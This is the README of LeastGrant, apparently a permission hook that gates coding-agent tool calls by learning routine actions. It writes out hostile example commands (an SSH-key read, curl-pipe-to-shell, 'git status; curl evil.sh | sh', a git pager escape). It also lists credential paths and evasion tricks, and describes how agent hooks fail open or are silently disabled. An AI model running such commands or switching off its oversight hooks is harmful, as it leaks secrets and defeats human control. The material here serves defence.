<div align="center">

# LeastGrant

**Permissions that learn how you work.**

Your coding agent asks permission for everything, so you stopped reading the prompts.
LeastGrant learns what your agents normally do, lets the routine through, and stops on the rest.

[Install](#install) · [How it decides](#how-it-decides) · [What learning will never unlock](#what-learning-will-never-unlock) · [What it is not](#what-it-is-not) · [Threat model](THREAT-MODEL.md)

</div>

---

## The problem

There are two ways people run coding agents today, and both are bad.

**Clicking Allow.** The prompt has no idea what is normal for you. It asks about `git status` with
the same gravity as `git push --force`, forty times an hour, until you stop reading it. A permission
prompt you always say yes to is not a security control. It is a latency tax with a security theme.

**Turning it off.** So most people who use agents seriously end up running
`--dangerously-skip-permissions`, or `acceptEdits`, or a YOLO mode of some description. It is a
completely rational response to the first problem. It also means that the one time in ten thousand
the agent decides to `cat ~/.ssh/id_rsa` and POST it somewhere, nothing is watching.

LeastGrant is for the space in between: a layer that knows the difference between your hundredth
`npm test` and the first time anything on this machine has tried to read a private key.

## What it looks like

```console
$ leastgrant check "npm test"

  ? ask  npm test

  what it does   runs the "test" script, which by its name tests or checks the code;
                 the script body is not analysed
  blast radius   reach workspace  │  undo easy  │  scale many

  why
    • LeastGrant has not seen enough of this yet to stop asking
    • LeastGrant has barely seen this project yet, so it is asking about most things

  ╰ approve this 5 more times (on 2 separate days) and it stops asking — or run: leastgrant
    allow "npm test"
```

Five approvals across two separate days later, it stops asking. Meanwhile:

```console
$ leastgrant check "cat ~/.ssh/id_rsa"

  ? ask  cat ~/.ssh/id_rsa

  what it does   reads a credential file
  blast radius   reach machine │ undo trivial │ secrets reads-secrets
  touches        …/.ssh/id_rsa (credentials)

  why
    • this reads …/.ssh/id_rsa, which holds credentials
    • this reaches …/.ssh/id_rsa, which is outside the project
    • LeastGrant never auto-approves this kind of action, however often it happens

  ╰ this always asks. To pre-answer it, run: leastgrant allow "cat <path:secret>" --force
```

That one never gets learned. Not after five approvals, not after five thousand — see
[floors](#what-learning-will-never-unlock).

And the case every command allowlist gets wrong:

```console
$ leastgrant check "curl -sSL https://get.example.com/install.sh | sh"

  ? ask  curl -sSL https://get.example.com/install.sh | sh

  what it does   runs whatever the download returned, as a sh script
  blast radius   reach machine │ undo irreversible

  this command runs 2 things:
    • curl -sSL https://get.example.com/install.sh  net.fetch
    • sh  exec.unknown

  why
    • this runs code that was just downloaded, so what it does depends on what the
      server sent back
    • this cannot be undone
    • LeastGrant could not fully account for what this command does, and it only
      auto-approves things it understands
    • LeastGrant never auto-approves this kind of action, however often it happens
    • this command runs 2 separate things; the verdict reflects the most far-reaching one

  ╰ there is no safe way to pre-approve this one: LeastGrant cannot see what the code
    does, so it asks every time
```

## Install

```bash
npm install -g leastgrant
leastgrant init
```

`init` does not ask you to write a policy. It reads the session history your agents have already
left on disk, replays every tool call through the decision engine, and tells you what it would have
done — including what it would have got wrong.

On the machine this was developed on, that was around eleven thousand real tool calls across 20
projects. This is a real run, captured 2026-08-31:

```
  ✓ 59 sessions across 20 projects   10,956 actions, about 10 days of history

  What they have been doing
    looking around                     ██████████████████ 8,344
    reading project files              █████████████████░ 7,672
    housekeeping                       ██████████░░░░░░░░ 4,595
    running something unrecognised     █████████░░░░░░░░░ 4,140
    editing project files              ███████░░░░░░░░░░░ 3,432
    reading files outside the project  █████░░░░░░░░░░░░░ 2,258
    calling an MCP server              ██░░░░░░░░░░░░░░░░ 969
    writing outside the project        ██░░░░░░░░░░░░░░░░ 911

  97% of that ran in a mode where nobody was asked. LeastGrant counts those as things
  it has seen, not things you approved — so they teach it what is normal here without
  granting anything.

  The kind of thing it would have stopped to ask about
    ? Read .env
      This reads …/.env, which holds credentials.
    ? git config --get credential.helper
      This reads something that holds credentials.
    ? scp -o StrictHostKeyChecking=accept-new …
      This sends data off the machine, so anything it can read it can also leak.

  Checking itself
    ✓ of the 44 actions you turned down, LeastGrant would have waved through none.
```

That last section is the one worth reading. The replay reports its own mistakes: any action you
actually refused that LeastGrant would have allowed. If that number is not zero, it says so, in
bold, before it asks to install anything.

Then it makes a proposal, because *none* of that history counts as your consent. Not the 97% that
ran unattended, and not the rest either: a transcript records that a call ran, not that a human
said yes, and a transcript is a file that something other than your agent could have written. So
mining tells LeastGrant what is normal here and nothing more.

```
  What it could stop asking about

   1. ✓ Read and search files in your projects        13,187 times so far
        opening, listing and grepping files inside a project directory
        not files outside the project, and not anything that looks like a credential
   2. ✓ Edit and create files inside your projects     3,307 times so far
        the ordinary work of a coding agent, all recoverable from version control
        not files outside the project, not shell profiles or git hooks
   3. ✓ Run your build and test commands                 808 times so far
   4. • Call the MCP servers you already use              643 times so far
   5. ✓ Look at git state                                 424 times so far
   6. • Make local git commits and branches                156 times so far
   7. • Install dependencies                                 8 times so far

  The 4 marked bundles cover about 50% of everything your agents did. Floors still
  apply on top: credentials, anything outside a project, shell profiles and git hooks
  keep asking regardless.

  Approve the marked bundles? [Y]es / [a]ll / [n]one / numbers like 1,3
```

One deliberate answer, with the consequences on screen, instead of six thousand prompts. Measured on
that same history, the starter grants took it from 5% to **41% of actions running without a prompt,
and zero regressions** against the 44 refusals on record.

Those figures come from one developer's machine and one month of work, which is a sample of one —
so re-derive them on yours rather than taking them from a README.
[`scripts/verify-claims.mjs`](https://github.com/leastgrant/leastgrant/blob/main/scripts/verify-claims.mjs)
recomputes the headline figures — session and action counts, the unattended share, the refusal
count, the before-and-after allow rates and bundle coverage — from your own transcripts. The
per-bundle counts and the capability breakdown come from `leastgrant init --dry-run`, which writes
nothing.

## How it decides

Every tool call goes through the same six steps, in this order. The order is the product.

| | | |
|---|---|---|
| 1 | **Integrity floors** | `deny`. Nothing overrides these — not a rule, not you. |
| 2 | **Your deny rules** | `deny`. You said never. |
| 3 | **Your allow rules** | `allow`. You already answered this question. |
| 4 | **Ask floors** | `ask`. Learning can never unlock these. |
| 5 | **Learned promotion** | `allow`, if the evidence clears the bar for this blast radius. |
| 6 | **Otherwise** | `ask`. |

Two things about that table are worth dwelling on.

**Your allow rules sit above the ask floors** (3 above 4). A floor exists to get a human answer, and
a rule *is* a human answer, given in advance. Integrity floors are the exception, because an agent
quietly editing the thing that is watching it is not a decision anybody made.

**Learning only ever operates at step 5.** It decides whether to stop asking about things that were
already in the "could be automatic" band. It never widens that band. There is no sequence of boring,
patient, approved behaviour that adds up to permission to read a private key, because reading a
private key is not decided at step 5 at all.

### Blast radius is four things, not a score

`0.7314` is not an explanation. LeastGrant reports what an action can actually do:

- **reach** — `workspace` · `machine` · `network` · `external` · `production`
- **undo** — `trivial` · `easy` · `hard` · `irreversible`
- **secrets** — can it read credentials, can it move them off the machine
- **scale** — one thing, many things, or sweeping

These combine into a tier only for threshold comparisons, by taking the **maximum** of the first
three, never an average. An action that is trivially reversible but reads your SSH key is not
"medium risk". It is a credential read. Averaging is how security tools end up approving the one
thing that mattered.

Scale is the exception, and it adds rather than competes: doing something to many things, or
sweepingly, pushes the tier up — but only when there is already something to amplify, meaning the
action reaches beyond the project, is hard to undo, or touches credentials. Without that condition
`npm test` (many files, all of them yours, all recoverable) would land a tier above where it
belongs and ask for eleven approvals instead of five.

### Evidence is typed by how it was obtained

This is the backbone of the design, and the thing most learning-based tools get wrong.

| | what it means | what it can promote |
|---|---|---|
| **confirmed** | you approved it | anything up to tier 2, at the confidence its blast radius demands |
| **granted** | you approved it as a reviewed bundle during setup | the same, immediately |
| **observed** | it merely *happened*, in a mode where nobody was asked | only actions that stay in the project, undo trivially, and touch no credentials |
| **denied** | you refused it | nothing, ever again |

An action that ran while you were asleep in bypass mode tells LeastGrant what is *typical*. It does
not tell it what is *sanctioned*. Typicality is strong evidence of abnormality and weak evidence of
safety, so it is used only in the first direction. A learning permission system that conflates the
two can be trained by the thing it is supposed to be watching.

**Denials are permanent. Approvals decay** on a 90-day half-life. Saying no once means it keeps
asking, and only a rule you write yourself undoes that — so "wait for the refusal to expire" is not
a strategy.

### How much evidence, exactly

For a clean record, the Wilson lower bound has a pleasant closed form: **`n / (n + z²)`** with
z = 1.645. That is the entire promotion schedule, and you can check it with a calculator:

| approvals | confidence | what it unlocks |
|---|---|---|
| 5 | 0.65 | tier 0–1 — reads, inspections, project-local edits |
| 11 | 0.80 | tier 2 — anything that reaches the machine or the network |
| 25 | 0.90 | (nothing: tier 3+ is never promotable) |

Plus: approvals must span at least 2 sessions and 2 days, so a single runaway session cannot
bootstrap its own trust. There is a second, weaker route for work that cannot do harm even if the
agent was misbehaving — reads and inspections that stay inside the project — which settles after 8
sightings across 2 sessions with no second day required. Nothing that writes, deletes or reaches
the network is eligible for it.

## What learning will never unlock

These are floors, not thresholds: no number of repetitions climbs over them. One thing they are
not is absolute. All but the first are `ask` floors, and a rule you write yourself sits above them
— `leastgrant allow "cat <path:secret>" --force` really does mean it. What learning cannot do on
its own, you can still do on purpose.

- **Reading credentials** — `.env`, `~/.ssh`, `~/.aws`, `~/.kube`, `.npmrc`, `.pem`/`.key`, cloud
  service-account JSON, browser cookie stores, agent config that holds API keys, shell history.
- **Anything that sends data off the machine** while it can also read your files.
- **Writing outside the project**, and deleting anything outside it.
- **Persistence** — `.bashrc`, `.zshrc`, `.envrc`, `.git/hooks`, `.husky`, crontab, systemd units,
  scheduled tasks, Windows Run keys. Code that runs later, outside any agent session.
- **Executing code it cannot read** — `curl | sh`, `eval`, a script file, a Makefile target,
  `python -c`, `docker exec`, base64-encoded PowerShell.
- **Privilege escalation**, publishing packages, and anything named like production.
- **Editing LeastGrant's own records** — denied outright. **Editing agent hook config** — always
  asks. In bypass mode an agent can write anywhere, including to the file that installs this hook.
  Removing the seatbelt should not be a quiet action.
- **Anything it did not fully understand.** If the parser could not account for a command, that is
  itself the signal. Obfuscation must not be a way to look boring.

## Why not just match the command string

Because `git status` and `git status; curl evil.sh | sh` both start with `git status`.

LeastGrant tokenizes and parses the shell, then peels wrappers until it reaches something it can
name. `sudo rm -rf /` is an `rm`. `bash -c "curl x | sh"` is not a `bash`. `xargs rm` is an `rm`
whose arguments nobody can predict. `find -exec` runs a program per file. `git -c core.pager='!sh'`
is arbitrary code execution wearing a `git log`.

[`test/bypass.test.ts`](https://github.com/leastgrant/leastgrant/blob/main/test/bypass.test.ts) is a corpus of 46 real allowlist evasions — separators,
command substitution, backticks, process substitution, ANSI-C quoting, `/dev/tcp`
redirects, `LD_PRELOAD`, `BASH_ENV`, `env` and `git -c` wrappers, path traversal, and
`..` stepped off the far end of a symlink. Each one is
checked against a LeastGrant that has been *deliberately trained* with hundreds of approvals for the
innocuous-looking prefix. If any is ever auto-approved, the build fails.

Writing that corpus, and the hostile audit that followed it, found real bugs in this codebase —
which is rather the point of writing it. The commits are the record; there is no count worth
quoting here that you could check.

Measured against 6,057 real Bash commands from actual agent sessions on one machine: the shell
parser accounted for **6,054 of them, with 0 crashes and 0.03 ms average parse time.**

Parsing is the easy half. Of those commands, **44.5% are ones LeastGrant will say it fully
understands**; the rest contain inline code (`python -c`, `node -e`), a script file, a package
runner, or a program it has no knowledge of. Those are marked not-understood and always ask, which
is the single largest source of prompts and is the honest answer — there is no way to know what
`python -c "$SCRIPT"` does without running it. That number is a property of one developer's
command mix as much as of LeastGrant; yours will differ.

## What it is not

A short list, because the fastest way to lose a security-minded reader is to overclaim.

**It is not a sandbox.** It answers a question the agent asks it. It does not confine a process,
intercept syscalls, or contain anything already running.

**It fails open.** If the hook crashes or times out, Claude Code treats that as a non-blocking error
and *runs the tool call anyway*. That is the hook contract, not a choice. LeastGrant is a reliable
veto and a best-effort grant, and it is designed around that asymmetry.

**Once a command is approved, it has no further say.** Approving `npm test` approves whatever the
test script does.

**It cannot read code it has not been given.** It can see that a script will run. It cannot see what
is in it.

**The classification knowledge is opinion.** It lives in
[`src/core/knowledge/`](src/core/knowledge/) precisely so you can read it, disagree with it, and
send a patch.

The full version is in [THREAT-MODEL.md](THREAT-MODEL.md), including the attacks considered against
the learning itself and where the countermeasures stop.

## Commands

```
leastgrant init                      read the history you already have, then set up
leastgrant status                    what it knows about this project
leastgrant check "<command>"         ask what it would decide, without running anything
leastgrant why [n]                   explain a recent decision in full
leastgrant trail                     what your agents have been doing
leastgrant simulate                  replay history against each setting and compare
leastgrant allow/deny/forget <pat>   pre-answer something, or change your mind
leastgrant doctor                    check the setup, and what your agents can reach
leastgrant install [agent]           wire it into an agent
```

`leastgrant check` is the one to reach for first. Every *decision* on this page is something you can put
into it and watch happen.

## Settings

Four postures. `simulate` shows the trade-off for the three that reach a verdict — `observe` never
intervenes, so there is nothing to compare — against your own history rather than
asking you to guess:

| | |
|---|---|
| `observe` | watches, never intervenes. Try it for a week; it cannot get in the way. |
| `assist` | **default.** Familiar low-risk work goes through, everything else asks. |
| `autopilot` | for people who were going to run bypass mode anyway. Code that stays inside the project runs without being read first — **every other floor still applies**, which is strictly more than bypass mode gives you. |
| `strict` | only what you have explicitly allowed. |

```console
$ leastgrant simulate

  Replaying 928 actions from the last 30 days in /home/you/project

  mode           runs freely    asks you   blocks   missed
  assist *          97 (46%)         113        0   none
  autopilot         97 (46%)         113        0   none
  strict              0 (0%)         210        0   none
```

`missed` is the column that should decide it: actions you actually turned down that this setting
would have let through.

## Agent support

<!-- BEGIN generated: agent-support -->

<!-- Generated by scripts/gen-readme.mjs from compatibility/*.json. Do not edit by hand. -->

| Agent | Status | allow | ask | deny | if the hook breaks | verified against |
|---|---|---|---|---|---|---|
| **Claude Code** | Enforcing | yes | degrades | yes | runs anyway | 2.1.240 on win32 |
| **Codex CLI** | Enforcing | ignored | no | yes | runs anyway | 0.152.0 on win32 |
| **Cursor** | Partial | yes | partial | yes | refuses | 3.18.25, not run live |
| **GitHub Copilot CLI** | Enforcing | yes | degrades | yes | refuses | 1.0.82 on win32 |

`ask` is the column that matters and the one that differs most. `yes` means a
prompt reaches a person. `degrades` means it reaches them where a prompt
surface exists and becomes a deny where none does. `no` means the agent has no
ask at all, so LeastGrant is a veto there rather than a question.

**What each one cannot do.** Not a disclaimer — the point of the table above is
that this list exists and is specific.

- **Claude Code.** Managed policy `disableAllHooks: true` switches every hook off, including managed ones, with no signal LeastGrant can see. It is silently absent. Fails open on crash and on timeout, so a LeastGrant that cannot start enforces nothing. A hook ask in non-interactive mode is a deny, not a prompt. The public docs list PreModelSwitch and PostModelSwitch, which do not exist in the installed 2.1.240 binary. Only PreToolUse and PostToolUse are registered, so failed calls are never observed and their pending entries are never resolved. Verified on Windows only. macOS and Linux run the same code path but nobody has driven the real binary there.
- **Codex CLI.** No ask verdict exists at all. On Codex, LeastGrant is a veto rather than a prompt. A handler declared `"async": true` cannot apply control effects: its deny, its exit-2 block and its updatedInput are all silently ignored. A single wrong word in the config is a total, unsignalled bypass. Hook trust is bound to a hash of the definition, so upgrading or reinstalling re-flags the hook and it stops running until re-trusted in /hooks. On Windows the trust hash covers only `commandWindows` and on POSIX only `command`, so one hooks.json has different hashes on different machines. `codex exec` has no trust review and no warning: an untrusted or modified handler is simply never added to the handler set, and nothing says so. Fails open on crash and on timeout. `[features] hooks = false` and `allow_managed_hooks_only = true` disable user hooks entirely. PermissionRequest has never fired in a real session. `codex exec` runs unattended, where by definition nothing prompts, so that path is contract-tested only. Verified on Windows only.
- **Cursor.** File reads are observed after the fact, not gated. A deny stops the content reaching the model but the file has already been read. Writes, edits and deletes have no pre-execution event and are not intercepted at all. An ask on preToolUse is rejected as unsupported and the tool call errors, which is neither a prompt nor a clean degradation. No permission mode reaches the hook, so LeastGrant cannot tell an attended session from an unattended one. Cursor also ingests Claude Code hooks from .claude/settings.json and ~/.claude/settings.json, so installing both adapters may double-fire. Never run inside a live Cursor session. The contract is verified against the shipped 3.18.25 bundle; the integration is not verified at all. Never run inside a live Cursor session. The installer sets `failClosed` on the three gating events, and Cursor turns malformed hook output into a deny, so LeastGrant fails closed here — but both of those are read from the shipped bundle rather than observed in a running session. Reads and MCP calls are covered; writes are not, so the support level is partial rather than enforcing.
- **GitHub Copilot CLI.** No permission mode is sent, so LeastGrant cannot tell an attended run from an unattended one and records observation rather than approval. Copilot therefore learns more slowly, deliberately. Failing closed means a broken or missing LeastGrant blocks all work rather than silently permitting it. Safer, and much louder. Speaks Claude Code's wire format, so it shares that adapter. A divergence upstream would surface as Copilot-shaped bugs in a file named for Claude. This file's unknown fields need a dedicated binary read; the research pass for it did not complete. Verified on Windows only.

**Looked at, no adapter shipped.**

- **Google Antigravity** (2.11.0). Evaluated, no adapter.
- **OpenCode** (1.18.26). The hook that looks like the right surface does not work. `permission.ask` is declared in the shipped plugin types and is never fired by the shipped binary — confirmed by live probe: a plugin exporting it, returning deny, against a real permission request, was never called. Everything else on offer is either an observation point that cannot veto, or a config ruleset evaluated before any plugin sees it. An adapter built on this could not honestly claim to enforce.

<!-- END generated: agent-support -->

One profile, one set of floors, whichever agent you are using that day. Every adapter calls the
same `judgePre` and `recordPost`, so there is one decision path rather than one per editor — a
security story that changes depending on which editor you opened is not a security story.

Two caveats worth stating in the open, because both are places an agent cannot express `ask` and
LeastGrant has to decide what to do instead.

**Cursor.** Its `beforeReadFile` event takes allow or deny and has no "ask". An unfamiliar read is
therefore allowed rather than blocked, because turning every unrecognised file read into a hard
failure would make the integration unusable. A read of something LeastGrant recognises as a
credential *is* refused — though read the word carefully: that event fires *after* the file has
been read off disk, so what a deny prevents is the content reaching the model, not the read. Shell
commands and MCP calls get the full allow/deny/ask, and writes, edits and deletes are not
intercepted at all.

**Codex.** It has no `ask` at all — `permissionDecision: "ask"` is parsed, rejected, and the call
runs anyway. What LeastGrant does instead depends on whether anything could still reach you, which
the payload's `permission_mode` tells it:

| what LeastGrant knows | what an `ask` becomes, in every Codex mode |
|---|---|
| it knows the action is dangerous | **deny**, with the rule that would permit it |
| it simply could not read the command | nothing — LeastGrant stands aside |

The mode is deliberately absent from that table now. It used to say `default`
meant "Codex prompts you. A real ask", and it does not: `permission_mode` is
derived from the approval policy alone, so `default` covers `-a on-request`,
where the *model* decides whether to ask, and `-a granular`, which can
auto-reject without showing anything. A floored action is therefore denied in
every mode, including the interactive one.

That second row is the interesting one, and the line it draws is between *knowledge* and
*ignorance*. A credential read, exfiltration, persistence, privilege escalation, running
just-downloaded code, an irreversible delete, a write outside the project, or a classifier that
crashed — all denied, because for those the harm is exactly "it was allowed through". But roughly
half of real commands are merely *not understood*: `node --version`, `make test`, `./deploy.sh`,
anything with an inline script. Denying those too would block most of an unattended run, and a gate
that blocks most of your work is a gate people remove — which leaves them with less protection, not
more. So ignorance stands aside.

The cost of that line is real and worth naming: in an unattended mode, `python -c '<anything>'` gets
through. That is the same hole you already have by running unattended at all, so LeastGrant is not
making it worse — but it is not closing it either.

So on Codex, for anything LeastGrant recognises as dangerous, it is a veto rather than a prompt:
strictly better than running Codex without it, and weaker than an agent that can express `ask` at
all. Claude Code is better here but not unconditionally — its `ask` also degrades to a deny
wherever no prompt surface exists, which is what `claude -p` is. The difference is that Codex has
no prompt surface to degrade *from*. A mode Codex adds in future that LeastGrant has not heard of
is treated as unable to prompt, so new modes make it stricter rather than quietly toothless.

**Copilot** honours all three verdicts, so there is no mapping to explain — but note that
non-interactive runs (`copilot -p`) have nobody to ask, and Copilot turns an `ask` into a deny
there. That is the safe direction, and it is Copilot's choice rather than LeastGrant's, but it does
mean a scripted Copilot run will stop on anything LeastGrant cannot account for.

Two operational notes, both learned the hard way.

**Codex binds hook trust to a hash of the definition**, so upgrading or reinstalling LeastGrant
re-flags the hook and it stops running until you re-trust it in `/hooks`. That is Codex being
careful rather than a bug, but the failure is quiet.

**On Windows, agents run hook commands through PowerShell.** PowerShell reads a statement beginning
with a quoted string as a string expression rather than a command, so a hook command that quoted
the path to `node.exe` — which the default install in `C:\Program Files\nodejs` forces — never
started at all. The two agents then failed in opposite directions and both were wrong: Codex failed
open and enforced nothing, Copilot failed closed and blocked everything. The installer now emits a
first token with no spaces, which no shell can misparse. If you hand-edit a hook command, keep that
property.

## Privacy

Everything is local. There is no account, no telemetry, and no network call — the package has **zero
runtime dependencies**, so there is no third-party code in the permission path at all.

State lives in `~/.leastgrant/` as plain text you can read: `config.json`, `ledger.jsonl`,
`denials.jsonl` (the permanent record of what you refused, replayed over the envelope on every
load so a refusal survives even a deleted profile), `leastgrant.log`, and a
learned profile per project. The ledger records command lines and file paths, never file contents or
conversation text, and everything written to it goes through a redactor first — because a tool that
logs every command in order to protect your secrets has just built an excellent place to store your
secrets. Details in [docs/privacy.md](docs/privacy.md).

## Contributing

The most useful thing you can send is a **bypass**: a command that gets auto-approved and should not
have been. Add it to [`test/bypass.test.ts`](https://github.com/leastgrant/leastgrant/blob/main/test/bypass.test.ts) and it becomes a permanent
regression test.

After that: the [knowledge modules](src/core/knowledge/), which are where the opinions live and
therefore where being wrong is most likely. Then adapters for other agents.

```bash
npm install && npm run build && npm test
```

Releases are cut by pushing a version tag; the workflow verifies everything and publishes to npm
with provenance. [RELEASING.md](RELEASING.md) documents it, including how to check that the copy
you installed is the one this repository built.

Node ≥ 20.10. TypeScript and `@types/node` are the only devDependencies. Tests are `node:test`. See
[CONTRIBUTING.md](CONTRIBUTING.md) and [docs/how-it-works.md](docs/how-it-works.md).

## Licence

Apache-2.0.
